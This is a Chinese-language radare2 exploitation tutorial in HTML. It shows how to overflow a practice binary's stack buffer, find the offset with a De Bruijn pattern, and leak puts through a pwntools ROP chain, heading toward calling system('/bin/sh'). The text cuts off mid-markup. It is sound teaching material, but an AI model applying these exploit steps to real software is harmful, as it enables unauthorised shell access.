        <content type="html"><![CDATA[<h2 id="radare2利用"><a href="#radare2利用" class="headerlink" title="radare2利用"></a>radare2利用</h2><p>更新radare2:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://github.com/radare/radare2.git # clone radare2 if you didn&apos;t do it yet for some reason.</span><br><span class="line">$ cd radare2</span><br><span class="line">$ ./sys/install.sh</span><br></pre></td></tr></table></figure></p><p>下载可执行程序<a href="https://github.com/ITAYC0HEN/A-journey-into-Radare2/blob/master/Part%202%20-%20Exploitation/megabeets_0x2" target="_blank" rel="noopener">here</a>,或者源码<br><a href="https://github.com/ITAYC0HEN/A-journey-into-Radare2/blob/master/Part%202%20-%20Exploitation/megabeets_0x2.c" target="_blank" rel="noopener">here</a></p><p>使用<code>$ gcc -m32  -fno-stack-protector megabeets_0x2.c -o megabeets_0x2</code>编译</p><hr><ol><li>使用rabin2 扫描基本信息</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">➜  文档 rabin2 -I megabeets_0x2 </span><br><span class="line">arch     x86</span><br><span class="line">baddr    0x8048000</span><br><span class="line">binsz    6072</span><br><span class="line">bintype  elf</span><br><span class="line">bits     32</span><br><span class="line">canary   false</span><br><span class="line">sanitiz  false</span><br><span class="line">class    ELF32</span><br><span class="line">crypto   false</span><br><span class="line">endian   little</span><br><span class="line">havecode true</span><br><span class="line">intrp    /lib/ld-linux.so.2</span><br><span class="line">laddr    0x0</span><br><span class="line">lang     c</span><br><span class="line">linenum  true</span><br><span class="line">lsyms    true</span><br><span class="line">machine  Intel 80386</span><br><span class="line">maxopsz  16</span><br><span class="line">minopsz  1</span><br><span class="line">nx       true</span><br><span class="line">os       linux</span><br><span class="line">pcalign  0</span><br><span class="line">pic      false</span><br><span class="line">relocs   true</span><br><span class="line">relro    partial</span><br><span class="line">rpath    NONE</span><br><span class="line">static   false</span><br><span class="line">stripped false</span><br><span class="line">subsys   linux</span><br><span class="line">va       true</span><br></pre></td></tr></table></figure><p>可知，开启了NX（not executable）保护，意味着无法在栈中执行shellcode. 未开启canary,pic(position independent code),relro保护.</p><ol start="2"><li>了解可执行程序逻辑</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  文档 r2 -d megabeets_0x2 </span><br><span class="line">Process with PID 12672 started...</span><br><span class="line">= attach 12672 12672</span><br><span class="line">bin.baddr 0x08048000</span><br><span class="line">Using 0x8048000</span><br><span class="line">asm.bits 32</span><br><span class="line">glibc.fc_offset = 0x00148</span><br><span class="line"> -- Add custom Have you setup your ~/.radare2rc today?</span><br><span class="line">[0xf76f9a20]&gt; aas</span><br><span class="line">[0xf76f9a20]&gt;</span><br></pre></td></tr></table></figure><p>-d : 开启调试模式<br>aas : 分析函数、符号等</p><p>注意： 并不是所有情况下都适合用<code>aaa</code>分析可执行程序，有关具体使用建议可见 <a href="https://reverseengineering.stackexchange.com/a/16115/18698" target="_blank" rel="noopener">this answer</a></p><p>控制可执行程序运行到main函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[0xf76f9a20]&gt; dcu main</span><br><span class="line">Continue until 0x08048658 using 1 bpsize</span><br><span class="line">hit breakpoint at: 8048658</span><br><span class="line">[0x08048658]&gt;</span><br></pre></td></tr></table></figure></p><p>dcu: debug continue util,调试模式下运行，直到到达指定位置。</p><p>输出反汇编代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">[0x08048658]&gt; pdf</span><br><span class="line">            ;-- eip:</span><br><span class="line">/ (fcn) main 135</span><br><span class="line">|   int main (int argc, char **argv, char **envp);</span><br><span class="line">|           ; var int local_ch @ ebp-0xc</span><br><span class="line">|           ; var int local_4h @ ebp-0x4</span><br><span class="line">|           ; arg int arg_4h @ esp+0x4</span><br><span class="line">|           ; DATA XREF from sym._start (0x80483e7)</span><br><span class="line">|           0x08048658      8d4c2404       lea ecx, [arg_4h]           ; 4</span><br><span class="line">|           0x0804865c      83e4f0         and esp, 0xfffffff0</span><br><span class="line">|           0x0804865f      ff71fc         push dword [ecx - 4]</span><br><span class="line">|           0x08048662      55             push ebp</span><br><span class="line">|           0x08048663      89e5           mov ebp, esp</span><br><span class="line">|           0x08048665      51             push ecx</span><br><span class="line">|           0x08048666      83ec14         sub esp, 0x14</span><br><span class="line">|           0x08048669      83ec0c         sub esp, 0xc</span><br><span class="line">|           0x0804866c      6860870408     push str..::_Megabeets_::.  ; 0x8048760 ; &quot;\n  .:: Megabeets ::.\n&quot;</span><br><span class="line">|           0x08048671      e81afdffff     call sym.imp.puts           ; int puts(const char *s)</span><br><span class="line">|           0x08048676      83c410         add esp, 0x10</span><br><span class="line">|           0x08048679      83ec0c         sub esp, 0xc</span><br><span class="line">|           0x0804867c      6876870408     push str.Show_me_what_you_got ; 0x8048776 ; &quot;Show me what you got?&quot;</span><br><span class="line">|           0x08048681      e80afdffff     call sym.imp.puts           ; int puts(const char *s)</span><br><span class="line">|           0x08048686      83c410         add esp, 0x10</span><br><span class="line">|           0x08048689      83ec08         sub esp, 8</span><br><span class="line">|           0x0804868c      8d45f4         lea eax, [local_ch]</span><br><span class="line">|           0x0804868f      50             push eax</span><br><span class="line">|           0x08048690      688c870408     push 0x804878c</span><br><span class="line">|           0x08048695      e816fdffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)</span><br><span class="line">|           0x0804869a      83c410         add esp, 0x10</span><br><span class="line">|           0x0804869d      8b45f4         mov eax, dword [local_ch]</span><br><span class="line">|           0x080486a0      83ec0c         sub esp, 0xc</span><br><span class="line">|           0x080486a3      50             push eax</span><br><span class="line">|           0x080486a4      e83fffffff     call sym.beet</span><br><span class="line">|           0x080486a9      83c410         add esp, 0x10</span><br><span class="line">|           0x080486ac      85c0           test eax, eax</span><br><span class="line">|       ,=&lt; 0x080486ae      7412           je 0x80486c2</span><br><span class="line">|       |   0x080486b0      83ec0c         sub esp, 0xc</span><br><span class="line">|       |   0x080486b3      6890870408     push str.Success            ; 0x8048790 ; &quot;Success!\n&quot;</span><br><span class="line">|       |   0x080486b8      e8d3fcffff     call sym.imp.puts           ; int puts(const char *s)</span><br><span class="line">|       |   0x080486bd      83c410         add esp, 0x10</span><br><span class="line">|      ,==&lt; 0x080486c0      eb10           jmp 0x80486d2</span><br><span class="line">|      |`-&gt; 0x080486c2      83ec0c         sub esp, 0xc</span><br><span class="line">|      |    0x080486c5      689a870408     push str.Nop__Wrong_argument. ; 0x804879a ; &quot;Nop, Wrong argument.\n\n&quot;</span><br><span class="line">|      |    0x080486ca      e8c1fcffff     call sym.imp.puts           ; int puts(const char *s)</span><br><span class="line">|      |    0x080486cf      83c410         add esp, 0x10</span><br><span class="line">|      |    ; CODE XREF from main (0x80486c0)</span><br><span class="line">|      `--&gt; 0x080486d2      b800000000     mov eax, 0</span><br><span class="line">|           0x080486d7      8b4dfc         mov ecx, dword [local_4h]</span><br><span class="line">|           0x080486da      c9             leave</span><br><span class="line">|           0x080486db      8d61fc         lea esp, [ecx - 4]</span><br><span class="line">\           0x080486de      c3             ret</span><br></pre></td></tr></table></figure></p><p>可知，通过scanf()读取输入，而后将输入传入sym.beet函数。</p><p>输入：VV，进入视图模式，按下<code>gc</code>跳入对应地<code>sym.beet</code>函数：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">.-----------------------------------------------.</span><br><span class="line">| [0x80485e8]                                   |</span><br><span class="line">| (fcn) sym.beet 112                            |</span><br><span class="line">|   sym.beet (int arg_8h);                      |</span><br><span class="line">| ; var int local_92h @ ebp-0x92                |</span><br><span class="line">| ; var int local_8eh @ ebp-0x8e                |</span><br><span class="line">| ; var int local_8ah @ ebp-0x8a                |</span><br><span class="line">| ; var int local_88h @ ebp-0x88                |</span><br><span class="line">| ; arg int arg_8h @ ebp+0x8                    |</span><br><span class="line">| ; CALL XREF from main (0x80486a4)             |</span><br><span class="line">| push ebp                                      |</span><br><span class="line">| mov ebp, esp                                  |</span><br><span class="line">| sub esp, 0x98                                 |</span><br><span class="line">| sub esp, 8                                    |</span><br><span class="line">| push dword [arg_8h]                           |</span><br><span class="line">| lea eax, [local_88h]                          |</span><br><span class="line">| push eax                                      |</span><br><span class="line">| ; char *strcpy(char *dest, const char *src)   |</span><br><span class="line">| call sym.imp.strcpy;[ga]                      |</span><br><span class="line">| add esp, 0x10                                 |</span><br><span class="line">| ; 'Mega'                                      |</span><br><span class="line">| mov dword [local_92h], 0x6167654d             |</span><br><span class="line">| ; 'beet'                                      |</span><br><span class="line">| mov dword [local_8eh], 0x74656562             |</span><br><span class="line">| ; 's'                                         |</span><br><span class="line">| ; 115                                         |</span><br><span class="line">| mov word [local_8ah], 0x73                    |</span><br><span class="line">| sub esp, 0xc                                  |</span><br><span class="line">| lea eax, [local_92h]                          |</span><br><span class="line">| push eax                                      |</span><br><span class="line">| call sym.rot13;[gb]                           |</span><br><span class="line">| add esp, 0x10                                 |</span><br><span class="line">| sub esp, 8                                    |</span><br><span class="line">| lea eax, [local_92h]                          |</span><br><span class="line">| push eax                                      |</span><br><span class="line">| lea eax, [local_88h]                          |</span><br><span class="line">| push eax                                      |</span><br><span class="line">| ; int strcmp(const char *s1, const char *s2)  |</span><br><span class="line">| call sym.imp.strcmp;[gc]                      |</span><br><span class="line">| add esp, 0x10                                 |</span><br><span class="line">| test eax, eax                                 |</span><br><span class="line">| sete al                                       |</span><br><span class="line">| movzx eax, al                                 |</span><br><span class="line">| leave                                         |</span><br><span class="line">| ret                                           |</span><br><span class="line">`-----------------------------------------------'</span><br></pre></td></tr></table></figure></p><p>可知：输入[arg_8h]被拷贝到缓冲区[local_88h],而后使用<code>rot13</code>加密字符串<code>Megabeets</code>，而后将加密结果与输入进行比较。</p><p>攻击点： 由于程序中并未检查输入的长度就执行拷贝到栈中的操作，这就意味着可以通过构造长字符串（超出buffer大小）造成栈溢出。</p><ol start="3"><li>构造payload</li></ol><p>目标是获取系统shell权限，首先确定要利用的存在漏洞的函数，其次，确定payload要填充的位置。</p><p>这里利用到radare2的一个组件：<code>ragg2</code>，它可以帮我们构造出一个<a href="https://en.wikipedia.org/wiki/De_Bruijn_sequence" target="_blank" rel="noopener">德布鲁因序列</a>，并且确定payload覆盖buffer的确切偏移。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  文档 ragg2 -P 100 -r</span><br><span class="line"><span class="meta">AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAh%</span><span class="bash">                                               ➜  文档</span></span><br></pre></td></tr></table></figure><p>由于程序是利用标注输入函数<code>scanf()</code>获取输入，而不是通过<code>copy-pate</code>方式，因此这里还会用到另一个组件：<code>rarun2</code></p><blockquote><p><code>rarun2</code>用于运行具有不同环境、参数、权限、目录的程序，并会覆盖默认文件描述符（e.g.stdin）<br>在你必须输入长参数运行程序，将大量数据传递给类似<code>stdin</code>的函数时，<code>rarun2</code>将会很有帮助，这种情况会经常出现在分析可执行程序的情况中。</p></blockquote><p>现在需要做以下三步：</p><ol><li>利用ragg2将De Bruijn 序列写入文件</li><li>新建<code>rarun2</code>配置文件座位<code>stdin</code>的输入</li><li>利用radare2找到payload在在栈中的偏移</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">➜  文档 ragg2 -P 200 -r &gt; pattern.txt</span><br><span class="line">➜  文档 cat pattern.txt </span><br><span class="line"><span class="meta">AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFA%</span><span class="bash">                                       </span></span><br><span class="line">➜  文档 vim profile.rr2</span><br><span class="line">➜  文档 cat profile.rr2 </span><br><span class="line"><span class="meta">#</span><span class="bash">!/usr/bin/rarun2</span></span><br><span class="line">stdin=./pattern.txt</span><br><span class="line">➜  文档 r2 -r profile.rr2 -d megabeets_0x2 </span><br><span class="line">Process with PID 13995 started...</span><br><span class="line">= attach 13995 13995</span><br><span class="line">bin.baddr 0x08048000</span><br><span class="line">Using 0x8048000</span><br><span class="line">asm.bits 32</span><br><span class="line">glibc.fc_offset = 0x00148</span><br><span class="line"> -- -bash: r2: command not found</span><br><span class="line"><span class="meta">[0xf7751a20]&gt;</span><span class="bash"> dc</span></span><br><span class="line"></span><br><span class="line">  .:: Megabeets ::.</span><br><span class="line"></span><br><span class="line">Show me what you got?</span><br><span class="line">child stopped with signal 11</span><br><span class="line">[+] SIGNAL 11 errno=0 addr=0x41417641 code=1 ret=0</span><br><span class="line"><span class="meta">[0x41417641]&gt;</span><span class="bash"></span></span><br></pre></td></tr></table></figure><p>将<code>pattern.txt</code>作为<code>stdin</code>的输入，使用r2运行程序成功接收到<code>SIGSEV 11</code></p><blockquote><p>信号是发送到进程或同一进程内的特定线程的异步通知，目的是通知对方发生的事件。<br>当进程内出现无效虚拟内存引用或分段错误（e.g. segmentation violation）时，<code>SIGSEGV 11</code>就会被发送给进程。</p></blockquote><p><code>0X41417641</code>代表的是<code>AvAA</code>(小端序)，来自于pattern的一段序列，radare可以帮我们找到De Bruijin序列中的特定序列的偏移。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[0x41417641]&gt;</span><span class="bash"> wop?</span></span><br><span class="line">|Usage: wop[DO] len @ addr | value</span><br><span class="line">| wopD len [@ addr]  Write a De Bruijn Pattern of length ‘len’ at address ‘addr’</span><br><span class="line">| wopO value         Finds the given value into a De Bruijn Pattern at current offset</span><br><span class="line"><span class="meta">[0x41417641]&gt;</span><span class="bash"> wopO 0x41417641</span></span><br><span class="line">140</span><br></pre></td></tr></table></figure><p>可知返回地址的覆盖发生在140bytes之后，现在可以开始着手构造payload.</p><p>对于像这样的二进制程序，有很多种方式可以让我们拿到系统shell，为了明确我们能做什么，我们首先要清楚我们不能做什么。<br>该二进制程序有<code>ASLR</code>保护，所以我们没法预测<code>libc</code>在内存中的位置，所以无法使用<a href="https://en.wikipedia.org/wiki/Return-to-libc_attack" target="_blank" rel="noopener">ret2libc</a>的攻击手段。<br>该二进制程序有<code>NX</code>保护，意味着我们不能在栈上执行<a href="https://en.wikipedia.org/wiki/Shellcode" target="_blank" rel="noopener">shellcode</a></p><p>为了绕过上述保护措施，我们再浏览一遍可执行程序提供给我们的函数和库。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">➜  文档 r2 -d megabeets_0x2 </span><br><span class="line">Process with PID 15481 started...</span><br><span class="line">= attach 15481 15481</span><br><span class="line">bin.baddr 0x08048000</span><br><span class="line">Using 0x8048000</span><br><span class="line">asm.bits 32</span><br><span class="line">glibc.fc_offset = 0x00148</span><br><span class="line"> -- Your endian swaps</span><br><span class="line"><span class="meta">[0xf770ea20]&gt;</span><span class="bash"> il</span></span><br><span class="line">[Linked libraries]</span><br><span class="line">libc.so.6</span><br><span class="line"></span><br><span class="line">1 library</span><br><span class="line"></span><br><span class="line"><span class="meta">[0xf770ea20]&gt;</span><span class="bash"> ii</span></span><br><span class="line">[Imports]</span><br><span class="line">Num  Vaddr       Bind      Type Name</span><br><span class="line">   1 0x08048370  GLOBAL    FUNC strcmp</span><br><span class="line">   2 0x08048380  GLOBAL    FUNC strcpy</span><br><span class="line">   3 0x08048390  GLOBAL    FUNC puts</span><br><span class="line">   4 0x00000000    WEAK  NOTYPE __gmon_start__</span><br><span class="line">   5 0x080483a0  GLOBAL    FUNC __libc_start_main</span><br><span class="line">   6 0x080483b0  GLOBAL    FUNC __isoc99_scanf</span><br><span class="line"></span><br><span class="line"><span class="meta">[0xf770ea20]&gt;</span><span class="bash"></span></span><br></pre></td></tr></table></figure><p>il: information libraries,列出程序中使用到的共享库<br>ii: information imports,列出程序中的导入函数</p><p>可以惊喜的发现使用了libc库且使用了<code>puts</code>和<code>scanf</code>函数，接下来我们利用这两个函数构造出一段payload.</p><p>步骤：</p><ol><li>泄漏<code>puts</code>函数地址</li><li>计算<code>libc</code>库基址</li><li>计算<code>system</code>地址</li><li>在<code>libc</code>中找到包含字符串<code>/bin/sh</code>的地址</li><li>调用<code>system</code>执行<code>/bin/sh</code>获取shell权限</li></ol><p><strong>第一阶段</strong></p><p>为了泄漏<code>puts</code>函数地址，我们需要使用到<code>ret2plt</code>技术。plt(procedure linkage table)是一种内存结构，其中包含了应用程序链接期间为导出函数生成的stub code,<br>当<code>.text</code>中的<code>call</code>指令调用某个函数时并不是直接调用目标函数。它会首先调用目标函数在PLT表中的stub code(e.g. func_name@plt).函数stub后跳转到GOT(global offset table)<br>表中包含的函数真实地址。如果是第一次被调用，在执行函数同时会调用动态连接器更新PLT表中函数地址位真实地址，下次调用就会直接跳转。推荐文章<a href="https://www.airs.com/blog/archives/38" target="_blank" rel="noopener">article</a></p><p>当然，我们需要找到<code>puts</code>在<code>PLT</code>和<code>GOT</code>中的地址，然后通过<code>puts@plt</code>（作为参数）调用<code>puts@got</code>.将这些函数调用串联起来发送给<code>scanf</code>.最后可以看到，我们通过<code>puts</code>函数打印出自身的内存地址。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[0xf770ea20]&gt;</span><span class="bash"> ?v reloc.puts</span></span><br><span class="line">0x804a014</span><br><span class="line"><span class="meta">[0xf770ea20]&gt;</span><span class="bash"> ?v sym.puts</span></span><br><span class="line">0x0</span><br><span class="line"><span class="meta">[0xf770ea20]&gt;</span><span class="bash"> ?v sym.imp.puts</span></span><br><span class="line">0x8048390</span><br><span class="line"><span class="meta">[0xf770ea20]&gt;</span><span class="bash"> ieq</span></span><br><span class="line">0x080483d0</span><br><span class="line"></span><br><span class="line"><span class="meta">[0xf770ea20]&gt;</span><span class="bash"></span></span><br></pre></td></tr></table></figure><p>可知<code>puts@plt</code>地址：0x8048390，<code>puts@got</code>地址：0x804a014，程序入口地址：0x080483d0</p><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># Addresses</span></span><br><span class="line">puts_plt = <span class="number">0x8048390</span></span><br><span class="line">puts_got = <span class="number">0x804a014</span></span><br><span class="line">entry_point = <span class="number">0x080483d0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># open process</span></span><br><span class="line">    p = process(<span class="string">"./megabeets_0x2"</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># Stage 1</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Initial payload</span></span><br><span class="line">    payload  =  <span class="string">"A"</span>*<span class="number">140</span> <span class="comment"># padding</span></span><br><span class="line">    ropchain =  p32(puts_plt)</span><br><span class="line">    ropchain += p32(entry_point)</span><br><span class="line">    ropchain += p32(puts_got)</span><br><span class="line"> </span><br><span class="line">    payload = payload + ropchain</span><br><span class="line"> </span><br><span class="line">    p.clean()</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># Take 4 bytes of the output</span></span><br><span class="line">    leak = p.recv(<span class="number">4</span>)</span><br><span class="line">    leak = u32(leak)</span><br><span class="line">    log.info(<span class="string">"puts is at: 0x%x"</span> % leak)</span><br><span class="line">    p.clean()</span><br><span class="line">  </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>运行脚本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  文档 python payload.py </span><br><span class="line">[+] Starting local process './megabeets_0x2': pid 19127</span><br><span class="line">[*] puts is at: 0xf75ec140</span><br><span class="line">[*] Stopped process './megabeets_0x2' (pid 19127)</span><br><span class="line">➜  文档 python payload.py</span><br><span class="line">[+] Starting local process './megabeets_0x2': pid 19163</span><br><span class="line">[*] puts is at: 0xf75c1140</span><br><span class="line">[*] Stopped process './megabeets_0x2' (pid 19163)</span><br></pre></td></tr></table></figure><p><strong>第二阶段</strong></p><p>计算libc基址：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">➜  文档 r2 -d megabeets_0x2 </span><br><span class="line">Process with PID 19217 started...</span><br><span class="line">= attach 19217 19217</span><br><span class="line">bin.baddr 0x08048000</span><br><span class="line">Using 0x8048000</span><br><span class="line">asm.bits 32</span><br><span class="line">glibc.fc_offset = 0x00148</span><br><span class="line"> -- Interpret radare2 scripts with '. &lt;path-to-script&gt;'. Similar to the bash source alias command.</span><br><span class="line"><span class="meta">[0xf7734a20]&gt;</span><span class="bash"> dcu entry</span></span><br><span class="line">Cannot continue until unknown address 'entry'</span><br><span class="line"><span class="meta">[0xf7734a20]&gt;</span><span class="bash"> dcu entry0</span></span><br><span class="line">Continue until 0x080483d0 using 1 bpsize</span><br><span class="line">hit breakpoint at: 80483d0</span><br><span class="line"><span class="meta">[0x080483d0]&gt;</span><span class="bash"> dmi libc puts</span></span><br><span class="line">205 0x0005f140 0xf75c3140 GLOBAL   FUNC  464 _IO_puts</span><br><span class="line">434 0x0005f140 0xf75c3140   WEAK   FUNC  464 puts</span><br><span class="line">509 0x000e9e40 0xf764de40 GLOBAL   FUNC 1162 putspent</span><br><span class="line">697 0x000eb450 0xf764f450 GLOBAL   FUNC  649 putsgent</span><br><span class="line">1182 0x0005dbf0 0xf75c1bf0   WEAK   FUNC  349 fputs</span><br><span class="line">1736 0x0005dbf0 0xf75c1bf0 GLOBAL   FUNC  349 _IO_fputs</span><br><span class="line">2389 0x000674f0 0xf75cb4f0   WEAK   FUNC  146 fputs_unlocked</span><br><span class="line"></span><br><span class="line"><span class="meta">[0x080483d0]&gt;</span><span class="bash"> dmi libc puts ~puts$</span></span><br><span class="line">205 0x0005f140 0xf75c3140 GLOBAL   FUNC  464 _IO_puts</span><br><span class="line">434 0x0005f140 0xf75c3140   WEAK   FUNC  464 puts</span><br><span class="line">1182 0x0005dbf0 0xf75c1bf0   WEAK   FUNC  349 fputs</span><br><span class="line">1736 0x0005dbf0 0xf75c1bf0 GLOBAL   FUNC  349 _IO_fputs</span><br><span class="line"><span class="meta">[0x080483d0]&gt;</span><span class="bash"> dmi libc puts~ puts$</span></span><br><span class="line">434 0x0005f140 0xf75c3140   WEAK   FUNC  464 puts</span><br><span class="line"><span class="meta">[0x080483d0]&gt;</span><span class="bash"> dmi libc system~ system$</span></span><br><span class="line">1457 0x0003a940 0xf759e940   WEAK   FUNC   55 system</span><br><span class="line"><span class="meta">[0x080483d0]&gt;</span><span class="bash"> dmi libc <span class="built_in">exit</span>~ <span class="built_in">exit</span>$</span></span><br><span class="line">141 0x0002e7b0 0xf75927b0 GLOBAL   FUNC   31 exit</span><br><span class="line"><span 